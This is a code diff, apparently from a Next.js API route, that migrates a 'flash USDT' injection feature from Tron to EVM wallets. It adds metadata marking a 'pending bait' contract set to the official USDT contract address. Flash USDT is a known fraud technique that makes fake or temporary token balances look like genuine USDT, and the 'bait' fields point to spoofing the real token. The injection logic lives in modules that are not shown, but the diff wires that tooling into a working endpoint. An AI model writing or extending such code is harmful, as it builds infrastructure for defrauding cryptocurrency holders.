@@ -10,8 +10,9 @@ import {
 import {
   injectFlashUsdt,
   injectPendingFlashUsdt,
-  isLabTronReady,
-} from "@/lib/tron/flash-usdt-lab";
+  isLabEvmReady,
+} from "@/lib/evm/flash-usdt-lab";
+import { getOfficialUsdtContractAddress } from "@/lib/evm/usdt-canonical";
 import type { LabInjectionMode } from "@/lib/labs/types";
 
 /**
@@ -95,7 +96,7 @@ export async function POST(req: Request) {
     if (existingInjection) {
       results.push({
         walletId: wallet.id,
-        tronAddress: wallet.tron_address,
+        walletAddress: wallet.wallet_address,
         skipped: true,
         reason: "Ya tiene inyección activa",
       });
@@ -118,8 +119,8 @@ export async function POST(req: Request) {
 
     const injectResult =
       injectionMode === "pending_flash"
-        ? await injectPendingFlashUsdt(wallet.tron_address, amount, flashDurationMinutes)
-        : await injectFlashUsdt(wallet.tron_address, amount);
+        ? await injectPendingFlashUsdt(wallet.wallet_address, amount, flashDurationMinutes)
+        : await injectFlashUsdt(wallet.wallet_address, amount);
 
     if (injectResult.success) {
       const successStatus =
@@ -136,6 +137,9 @@ export async function POST(req: Request) {
           injected_at: new Date().toISOString(),
           metadata: {
             deliveryMethod: injectResult.deliveryMethod,
+            pendingBaitContract: getOfficialUsdtContractAddress(),
+            lastPendingBaitAt: new Date().toISOString(),
+            pendingBaitRenewals: 0,
             flashExpiresAt:
               "flashExpiresAt" in injectResult ? injectResult.flashExpiresAt : null,
             flashBalance:
@@ -146,7 +150,7 @@ export async function POST(req: Request) {
 
       results.push({
         walletId: wallet.id,
-        tronAddress: wallet.tron_address,
+        walletAddress: wallet.wallet_address,
         success: true,
         mode: injectionMode,
         txHash: injectResult.txHash,
@@ -167,7 +171,7 @@ export async function POST(req: Request) {
 
       results.push({
         walletId: wallet.id,
-        tronAddress: wallet.tron_address,
+        walletAddress: wallet.wallet_address,
         success: false,
         error: injectResult.error,
       });
@@ -190,7 +194,7 @@ export async function POST(req: Request) {
       walletsProcessed: results.length,
       injectionMode,
       flashDurationMinutes,
-      tronReady: isLabTronReady(),
+      evmReady: isLabEvmReady(),
     },
     ip_address: getClientIp(req),
   });
@@ -200,7 +204,7 @@ export async function POST(req: Request) {
     injectionMode,
     flashDurationMinutes,
     expiresAt,
-    tronConfigured: isLabTronReady(),
+    evmConfigured: isLabEvmReady(),
     results,
   });
 }
